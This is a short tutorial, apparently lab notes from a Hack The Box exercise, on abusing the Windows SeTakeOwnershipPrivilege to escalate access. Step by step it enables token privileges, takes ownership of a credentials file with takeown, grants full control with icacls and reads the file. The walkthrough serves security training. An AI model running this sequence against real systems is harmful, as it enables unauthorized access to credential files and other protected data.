## 📖 What is SeTakeOwnershipPrivilege?

This privilege allows a user to:
- Take ownership of any **securable object** (files, folders, registry keys, etc.)
- Change the **owner** of an object using `WRITE_OWNER` permission

🔐 By default, only **Administrators** have this right.

⚠️ It is rare for regular users to have this, but **backup accounts** or **misconfigured users** may have it.


## 🧭 Why is it Useful?

If you can take ownership of a file:
- You can change its **Access Control List (ACL)**.
- You can grant yourself **Full Control**.
- You can read **sensitive files** (like `cred.txt` or `web.config`).


### Step 1: Check Privileges

```bash
whoami /priv 
```

Look for `SeTakeOwnershipPrivilege `
Even if **Disabled**, you can **enable** it.

###  Step 2: Enable the Privilege (if needed)

1. Download & Import the script:

```bash
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

2. Confirm it's now enabled:

```bash
whoami /priv
```

###  Step 3: Choose a Target File

Assume the file is:
C:\Department Shares\Private\IT\cred.txt

Check its details:

```bash
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select FullName, LastWriteTime, Attributes, @{Name="Owner"; Expression={(Get-Acl $_.FullName).Owner}}
```

###  Step 4: Take Ownership

```bash
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

 You should see:
SUCCESS: The file [...] now owned by user [...]


###  Step 5: Confirm New Owner

```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Name, Directory, @{Name="Owner"; Expression={(Get-Acl $_.FullName).Owner}}
```


###  Step 6: Grant Yourself Full Permissions

```
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

> Replace `htb-student` with your username if different.


###  Step 7: Read the File

```
cat 'C:\Department Shares\Private\IT\cred.txt'
```
